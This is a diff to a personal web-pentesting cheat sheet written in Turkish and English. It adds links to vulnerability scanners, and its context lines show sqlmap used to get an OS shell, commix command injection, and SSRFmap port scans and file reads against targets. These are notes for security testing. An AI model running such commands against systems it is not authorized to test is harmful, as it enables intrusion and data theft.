@@ -15,6 +15,10 @@ sqlmap -u http://<targetip>/comment.php?id=738 --dbms=mysql --osshell
 #Vuln scanner
 nikto -h <ipadres>
 skipfish -o dizin_adi http://url.com > ardından tarayıcıya git file///<dizinibul> örnek file///web_hack
+wascan -> https://github.com/FOGSEC/WAScan
+rapidscan -> https://github.com/skavngr/rapidscan
+nessus  -> https://www.tenable.com/products/nessus
+greenbone -> https://github.com/greenbone/openvas-scanner
 
 # Lfi scanner
 eger ssl kullaniyorsa site -S sonuna konacak
@@ -31,10 +35,13 @@ ornek = commix --url="http://192.168.1.53/bWAPP/commandi.php" --cookie="security
 
 
 # Ssrf Map
+
 Launch a portscan on localhost and read default files
 python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan -> Burp suite ile isteği yakala ve requests.txt adından kaydet.
 
 Launch a portscan against an HTTPS endpoint using a custom user-agent
 python ssrfmap.py -r data/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
 Daha fazla bilgi için https://github.com/swisskyrepo/SSRFmap.
+
+# Xsspwn 
 
